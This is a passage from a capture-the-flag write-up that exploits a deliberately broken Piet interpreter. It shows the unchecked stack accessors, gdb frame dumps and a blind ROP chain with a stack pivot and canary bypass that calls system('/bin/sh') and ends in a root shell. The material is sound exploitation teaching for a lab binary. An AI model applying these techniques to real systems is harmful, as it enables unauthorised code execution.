a base pointer and a depth that both live in a struct sitting right next to it.

### Vulnerabilities

Every stack operation goes through two accessors:

```c
static void stack_push(ProgramState *state, int32_t value) {
    state->stack[state->stack_depth++] = value;
}

static int stack_pop(ProgramState *state, int32_t *out) {
    *out = state->stack[--state->stack_depth];
    return 1;
}
```

Neither bounds-checks anything. `stack_depth` is a plain `int` (not even unsigned),
the buffer has 256 entries, and no comparison against either end appears anywhere in
the file.

#### stack_pop reports success unconditionally

The missing underflow check is the smaller half of that function. The larger half is
`return 1`. Every operator is written as if the return value meant something:

```c
static void op_add(ProgramState *s, int sz) {
    int32_t a, b; (void)sz;
    if (stack_pop(s, &a) && stack_pop(s, &b)) stack_push(s, b + a);
}
```

The guard can never be false. Not one operator in the table has a path that declines
to run because the stack was empty.

#### Two instructions move the index and write nothing

```c
static void op_up(ProgramState *s, int sz) {
    (void)sz;
    s->stack_depth++;
}
static void op_down(ProgramState *s, int sz) {
    (void)sz;
    s->stack_depth--;
}
```

These are the two entries that do not belong to Piet. They sit at the coordinates
canonical Piet reserves for `in(number)` and `out(char)`, and between them they turn
`stack_depth` into a signed index we can steer to any value, one step per codel,
without disturbing memory on the way. A 1 KB buffer becomes a relative read and write
at any 4-byte-aligned offset in the frame (either direction, no cost).

#### roll rotates a window of any width

```c
static void op_roll(ProgramState *s, int sz) {
    int32_t n, d; (void)sz;
    if (!stack_pop(s, &n) || !stack_pop(s, &d)) return;
    if (d <= 0) return;
    int count = ((n % d) + d) % d;
    for (int i = 0; i < count; i++) {
        int32_t top = s->stack[s->stack_depth - 1];
        for (int j = s->stack_depth - 1; j > s->stack_depth - d; j--)
            s->stack[j] = s->stack[j - 1];
        s->stack[s->stack_depth - d] = top;
    }
}
```

`d` is tested for being positive and for nothing else, so the window
`[stack_depth - d, stack_depth - 1]` can cover any span of the frame. A rotation is
also a permutation: nothing is lost, only displaced, which is what later moves a
finished block onto its target in one step.

### What the index reaches

The prologue of `interpret_program` gives away the layout:

```sh
0000000000003ed8 <interpret_program>:
    3ed8:	endbr64
    3edc:	push   rbp
    3edd:	mov    rbp,rsp
    3ee0:	sub    rsp,0x450
    ...
    3f0f:	lea    rax,[rbp-0x410]
    3f16:	mov    QWORD PTR [rbp-0x430],rax
```

`stack[0]` is `rbp-0x410` and `ProgramState` is `rbp-0x430`, a 0x20-byte struct
sitting immediately below the buffer. Counting `int32_t` slots from `stack[0]`:

```
rbp-0x430   ProgramState { stack, stack_depth, CC, DP, row, col }   [-8 .. -1]
rbp-0x410   int32_t stack[256]                                      [0 .. 255]
rbp-0x010   alignment padding                                       [256/257]
rbp-0x008   canary                                                  [258/259]
rbp+0x000   saved rbp                                               [260/261]
rbp+0x008   return address                                          [262/263]
rbp+0x010   main's own frame                                        [264 ...]
```

Two things follow from that map:

- the **canary** is bypassed by stepping over it. Writes go to 262 and 258/259 is
  never touched, so `__stack_chk_fail` never fires and `interpret_program` returns
  normally;
- **negative indices** land inside the interpreter's own control block, where
  `[-8]/[-7]` is the base pointer and `[-6]` is the depth field. One write retargets
  the base and makes the primitive absolute.

Walking the frame under gdb before anything runs shows the material we get to work
with:

```sh
gef> b *(interpret_program+0x59)   # prologue done, ProgramState initialised
gef> c

Breakpoint 1, 0x0000555555557f31 in interpret_program ()
gef> p $rbp
$1 = (void *) 0x7fffffffeb40
gef> x/12gx $rbp-8
0x7fffffffeb38:	0xc5786a5eae9dd200	0x00007fffffffeb60
0x7fffffffeb48:	0x0000555555558095	0x0000022500000010
0x7fffffffeb58:	0x000055555555c010	0x00007fffffffec10
0x7fffffffeb68:	0x00007ffff7d84601	0x00007fffffffec50
0x7fffffffeb78:	0x00007fffffffec98	0x00000001f7fc0000
0x7fffffffeb88:	0x0000555555557fb3	0x00007fffffffebd0
gef> info symbol 0x0000555555558095
main + 226 in section .text of ./piet
gef> info symbol 0x00007ffff7d84601
__libc_start_call_main + 129 in section .text of libc.so.6
```

`0x7fffffffeb38` is the canary, `0x7fffffffeb40` the saved rbp, `0x7fffffffeb48` the
return address into `main`. Eight slots further up, at `0x7fffffffeb68`, sits `main`'s
own return address, pushed by the `call` in `__libc_start_call_main`.

### Writing blind

Both output instructions are gone. `out(number)` was replaced by

```c
static void op_nuh_uh(ProgramState *s, int sz) {
    (void)s; (void)sz;
    printf("Removed for security reasons :3\n");
}
```

and `out(char)` by `op_down`. `in(char)` survives through `getchar`, `in(number)` is
now `op_up`, and the pixel dump in `main` only echoes the image we sent.

The chain has to go together blind, out of pointers *already* lying in the frame. Which
is enough, because the only operation we need is "add a constant to the low dword
without touching the high one". The anchor at `stack[270/271]` is
`__libc_start_call_main+129`, a fixed offset inside libc, so:

```c
pop rdi; pop rbp; ret   = anchor + 0x0004fa
"/bin/sh"               = anchor + 0x1b1198
system                  = anchor + 0x031f5f
```

This is exact as long as adding the delta does not carry out of the low 32 bits. The
largest delta is `0x1b1198`, so it only carries when the anchor's low dword lands that
close to `0xffffffff`; on those runs the process dies and we reconnect.

The same trick handles the binary. `stack[262/263]` already holds `main+226`, and
`leave; ret` in the same image is at `main+226 + 0x11`.

### Building the chain

Three mechanical problems stand between "we can index anywhere" and "the chain is in
place". None of them is deep, and all three shape the final program.

#### add leaves its constant above the result

To add `c` to `stack[i]` we need `c` at `stack[i+1]` and depth `i+2`. The result lands
in `stack[i]` and `stack[i+1]` keeps `c` afterwards. For a 64-bit value that is
exactly backwards. `i` is the low dword and `i+1` is the high dword, so fixing the low
half destroys the high half.

`roll` over a two-slot window is a lossless swap, so the pair is held inverted, as
`270 = high, 271 = low`:

```
set depth = i+2; push 2; push 1; roll   ->  stack[i] <-> stack[i+1]
```

All the arithmetic then runs on 271 and the debris lands in 272/273, clear of the
pair. Swap back once the value is finished.

#### dup only walks up, and burns the span

```c
static void op_dup(ProgramState *s, int sz) {
    int32_t a; (void)sz;
    if (stack_pop(s, &a)) { stack_push(s, a); stack_push(s, a); }
}
```

At depth `d`, `dup` copies `stack[d-1]` into `stack[d]`. Repeated, it drags a value
upward one slot at a time and overwrites everything it crosses, but a chain from
`src` to `dst` never writes `src-1`, and never writes `dst+1`.

That gives the ordering rule the whole build depends on. Fill targets in strictly
descending index order, and anything already finished sits above the next chain's
endpoint and survives. Building bottom-up would destroy each previous value in turn.

The inverted pair and the descending order combine neatly, because one source slot
then serves both halves. To place a high dword, swap so 271 holds it and drag it up;
to place a low dword, add the delta at 271 and drag that up. The other half stays at
270, below every chain's start, out of the line of fire.

#### the chain has to land below its own source

The anchor is at 270/271 and the chain has to start there. Assembling it in place is
therefore impossible, because the first write would destroy the source of the second.

The block goes together in free space at 278..285 instead, and moves afterwards with a
single `roll`. Window `[270, 285]` is 16 slots and the block sits 8 above the bottom,
so rotating by `16 - 8 = 8` drops it exactly onto 270..277.

```c
        before roll                    after roll(width=16, count=8)
[270]  0x00007fff  pair hi            0xf7d84afb  pop rdi; pop rbp; ret
[271]  0xf7d84afb  pair lo            0x00007fff
[272]  0xf7d84afb  \                  0xf7f35799  "/bin/sh"
[273]  0xf7d84afb  |                  0x00007fff
[274]  0xf7d84afb  |  dup debris      0xf7db6560  -> rbp, never read
[275]  0xf7d84afb  |                  0xf7db6560
[276]  0xf7d84afb  |                  0xf7db6560  system
[277]  0xf7d84afb  /                  0x00007fff
[278]  0xf7d84afb  \  pop rdi         0x00007fff  \
[279]  0x00007fff  |                  0xf7d84afb  |
[280]  0xf7f35799  |  "/bin/sh"       0xf7d84afb  |
[281]  0x00007fff  |                  0xf7d84afb  |  debris, now above
[282]  0xf7db6560  |  junk            0xf7d84afb  |  the chain
[283]  0xf7db6560  |                  0xf7d84afb  |
[284]  0xf7db6560  |  system          0xf7d84afb  |
[285]  0x00007fff  /                  0xf7d84afb  /
```

Eight slots of block are four qwords, each held low dword first. The pair itself no
longer reads as the anchor by this point: `put_low` has walked 271 forward by the
successive differences, so it holds `pop rdi`'s low dword, which is also what every
slot of debris below it is a copy of.

I got that count backwards first, and it was the one real bug in the whole build.
Rotating by the block's *position* instead of by `length - position` scatters it, and
with no output at all it fails in total silence. The layout above hides the mistake,
because `16 - 8` and 8 are the same number here; an earlier layout, where the two
counts differed, did not. What caught it was a model of the VM that replays every
instruction against a dict of slots and asserts the resulting qwords before a byte
goes on the wire:

```python
    want = {RET_SLOT: MODEL_BIN + LEAVE_RET}
    want.update({PAIR + slot: MODEL_LIBC + target for slot, target in chain})

    checks = [(slot,
               (vm.mem[slot + 1] & MASK) << 32 | (vm.mem[slot] & MASK),
               want[slot])
              for slot in sorted(want)]
    bad = [slot for slot, got, exp in checks if got != exp]
    if bad:
        raise SystemExit("model mismatch at slots %s" % bad)
```

The bases fed to it are the ones a debug run with ASLR off produces, `0x555555554000`
and `0x7ffff7d5a000`. The arithmetic is linear, so any pair would do, but these make
the model print exactly what gdb prints.

### The pivot

The chain needs four 64-bit slots, and straight off `interpret_program`'s `ret` they
would sit at 262..269, underneath the anchor they are built from and out of `dup`'s
reach. So `ret` is not where the chain can start.

`main` saves us the trouble:

```sh
0000000000003fb3 <main>:
    3fb3:	endbr64
    3fb7:	push   rbp
    3fb8:	mov    rbp,rsp
    3fbb:	sub    rsp,0x10
```

A 0x10 frame plus the pushed return address and rbp puts `main`'s rbp exactly 0x20
above `interpret_program`'s, which is `&stack[268]`. The saved rbp lying at 260/261 is
therefore already the value we want and needs no edit at all. It is visible in the
dump above: `0x7fffffffeb40` holds `0x7fffffffeb60`, and `0x7fffffffeb60` is
`&stack[268]`.

Put `leave; ret` in the return slot and the sequence is:

```
interpret_program: leave    rbp = stack[260/261] = &stack[268], rsp = &stack[262]
                   ret      -> leave;ret gadget                 rsp = &stack[264]
gadget:            leave    rsp = rbp = &stack[268]; pop rbp    rsp = &stack[270]
                   ret      -> chain[0]                         rsp = &stack[272]
```

Same session, one breakpoint later, on the `leave` that starts all this:

```sh
gef> b *(interpret_program+0xd9)
gef> c

Breakpoint 2, 0x0000555555557fb1 in interpret_program ()
gef> x/12gx $rbp-8
0x7fffffffeb38:	0xc5786a5eae9dd200	0x00007fffffffeb60
0x7fffffffeb48:	0x00005555555580a6	0x0000000100000002
0x7fffffffeb58:	0x000055555555c010	0x00007fffffffec10
0x7fffffffeb68:	0x00007ffff7d84afb	0x00007ffff7f35799
0x7fffffffeb78:	0xf7db6560f7db6560	0x00007ffff7db6560
0x7fffffffeb88:	0xf7d84afb00007fff	0xf7d84afbf7d84afb
gef> x/2i 0x00005555555580a6
   0x5555555580a6 <main+243>:	leave
   0x5555555580a7 <main+244>:	ret
gef> x/3i 0x00007ffff7d84afb
   0x7ffff7d84afb <iconv+187>:	pop    rdi
   0x7ffff7d84afc <iconv+188>:	pop    rbp
   0x7ffff7d84afd <iconv+189>:	ret
gef> x/s 0x00007ffff7f35799
0x7ffff7f35799:	"/bin/sh"
gef> info symbol 0x00007ffff7db6560
system in section .text of libc.so.6
gef> p/x *(unsigned long *)($fs_base+0x28)
$2 = 0xc5786a5eae9dd200
```

Four qwords in place, and two things that did not move. `0x7fffffffeb40` still holds
`0x7fffffffeb60`, the saved rbp the pivot runs on, so the build never reached down
that far. The canary at `0x7fffffffeb38` still matches `fs:0x28`, so the check about
to run will pass.

`0x7fffffffeb50` held the image dimensions before, `0x10` and `0x225`, and now
holds 2 and 1: the width and count `swap(RET_SLOT)` pushed for its `roll`, still
there after the instruction consumed them.

`0x7fffffffeb78` goes into rbp and holds `0xf7db6560f7db6560`, the low dword of
`system` in both halves, left there by the dup chain (nothing dereferences it
before `system` builds its own frame). gef labels the gadget `iconv+187`, which
it is not: `0x7ffff7d84afa` is `pop r15` and we enter one byte into it, so the
three instructions above are unaligned bytes borrowed out of `iconv`'s epilogue.

`pop rdi; pop rbp; ret` was picked over the plain `pop rdi; ret` for alignment:

```sh
gef> b system
gef> c

Breakpoint 3, __libc_system (line=0x7ffff7f35799 "/bin/sh")
    at ../sysdeps/posix/system.c:206
gef> p (char *)$rdi
$3 = 0x7ffff7f35799 "/bin/sh"
gef> p/x $rsp
$4 = 0x7fffffffeb88
gef> p ((unsigned long)$rsp) % 16
$5 = 0x8
```

`system` is entered with `rsp % 16 == 8`, exactly the way a `call` would leave it.
A plain `pop rdi; ret` puts it on 0 instead, and the whole chain still runs: the
program prints `halted`, `interpret_program` returns, `system` is reached with the
right argument, and then

```sh
Program received signal SIGSEGV, Segmentation fault.
0x00007ffff7db6115 in do_system (line=0x7ffff7f35799 "/bin/sh")
    at ../sysdeps/posix/system.c:117
gef> x/1i $rip
=> 0x7ffff7db6115 <do_system+101>:	movaps XMMWORD PTR [rsp],xmm1
gef> p ((unsigned long)$rsp) % 16
$1 = 0x8
```

`movaps` wants a 16-aligned address and gets one that is eight bytes off. Fixing that
with an alignment `ret` would mean one more libc value to construct, so the two-pop
gadget is the cheaper answer.

### Halting

The program also has to terminate normally, because `printf("halted\n")` and the
canary check both run before the `ret` we hijacked.

A strip of colour blocks along row 0 does *not* halt. `next_codel` tries all four
DP directions with both CC values:

```c
    for (int attempt = 0; attempt < 8; attempt++) {
        Pos exit = exit_codel(block, size, state->DP, state->CC);
        int nr = exit.row + DR[state->DP];
        int nc = exit.col + DC[state->DP];

        if (!in_bounds(img, nr, nc) || img->pixels[nr][nc] == BLACK) {
            if (attempt % 2 == 0)
                state->CC = (state->CC == LEFT) ? RIGHT : LEFT;
            else
                state->DP = (dir)((state->DP + 1) % 4);
            continue;
        }
```

so `DP = LEFT` always escapes back down the strip, and the whole program runs again in
reverse, dismantling the chain it just built. White blocks are no help either. In
canonical Piet a white dead end halts the program; here `slide_white` returns 0 at the
first obstruction, which sends `next_codel` back to the coloured block to retry, so
any corridor you can enter you can also leave.

The terminator that works is L-shaped, `T = {(1,n-1), (0,n), (1,n)}` entered from
`(0,n-1)`, with the last two program columns forced to height 1. Its minimum column
holds exactly one codel, `(1,n-1)`, with black to its left. Right and up are the image
edge, down is black. All four directions are blocked under both CC values,
`next_codel` returns 0, the canary check passes, and `ret` fires.

Those two height-1 columns still execute, so the program ends with two `push 1`.
Emitted after the rotation, they land at 286 and 287, above the finished chain rather
than in it.

### The finished program

549 x 16, scaled up 4x:

![the payload PNG, a wide strip of coloured codels](/images/l3ak_1.png)

The shape of the exploit is visible in it. The program opens with 264 `up` in a row,
one codel each, and that is the flat strip filling the left half: nothing in the image
is taller than a single codel until column 264, where the index has finished its walk
into the frame. The tall bars after it are the constants the chain arithmetic pushes.

Columns 336 to 379, one constant going together digit by digit, at 16x:

![a zoom of the payload showing individual codels and full-height columns](/images/l3ak_2.png)

The eight full-height columns are the `push 16` before each `mul`; the digits go in on
the short columns between them, 3, 1, 15, 5 and 15 here, with the leading three zero
and skipped. The program has 33 full-height columns in all: one per `mul`, plus the 16
the rotation pushes as its window width.

### Result

```sh
[*] payload: 548 instructions, 549 x 16, 538 bytes
[*] interpret_program returned, the chain is running
uid=0(root) gid=0(root) groups=0(root)
flag{local}
```
The source code for both exploits can be found [here](https://github.com/icctx/ctf/tree/main/l3ak.2026).

---
# Conclusion
Thanks for reading this far! 
I had a good weekend playing this ctf, thanks to the [L3ak Team](https://l3ak.team).
